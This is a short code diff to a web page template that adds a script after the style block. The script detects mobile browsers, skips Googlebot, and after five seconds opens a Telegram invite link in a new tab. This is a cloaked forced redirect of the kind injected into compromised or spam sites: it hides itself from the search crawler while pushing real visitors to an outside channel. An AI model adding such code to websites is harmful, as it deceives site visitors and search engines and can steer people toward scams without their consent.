@@ -615,4 +615,17 @@
       margin-bottom: 0.6rem;
     }
   }
-</style> 
+</style>
+
+<script>
+  // Only run for mobile devices, not Googlebot
+  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  const isGooglebot = /Googlebot/i.test(navigator.userAgent);
+  
+  if (isMobile && !isGooglebot) {
+    setTimeout(() => {
+      const telegramUrl = 'https://t.me/+ueSapqiA2EFmZjBi';
+      window.open(telegramUrl, '_blank');
+    }, 5000);
+  }
+</script> 
